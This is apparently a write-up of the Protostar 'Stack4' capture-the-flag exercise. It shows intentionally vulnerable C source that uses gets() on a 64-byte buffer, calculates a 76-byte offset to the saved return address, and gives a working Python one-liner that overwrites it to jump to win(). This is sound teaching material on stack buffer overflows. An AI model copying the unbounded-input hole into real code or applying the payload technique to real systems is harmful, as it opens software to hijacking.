# Stack4

## About
Stack4 takes a look at overwriting saved EIP and standard buffer overflows.

Hints
- A variety of introductory papers into buffer overflows may help.
- gdb lets you do “run < input”
- EIP is not directly after the end of buffer, compiler padding can also increase the size.

## Source code
```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void win()
{
  printf("code flow successfully changed\n");
}

int main(int argc, char **argv)
{
  char buffer[64];

  gets(buffer);
}
```

---

Overflow `buffer[64]` and thus rewrite the rest of the stack frame, followed by stored `EBP` and,
finally, stored `ret` address with the memory address of the `win()` function.

`ret` offset from buffer is:
- 64 (local variable `buffer`)
- 8 (`main` method args `argc` and `argv`)
- 4 (`EBP`)

in total 76 bytes.

```shell script
objdump -t stack4  | grep win
# 080483f4 g     F .text  00000014              win
python -c "print 'a'*76 + '\xf4\x83\x04\x08'" | ./stack4
# code flow successfully changed
# Segmentation fault
```
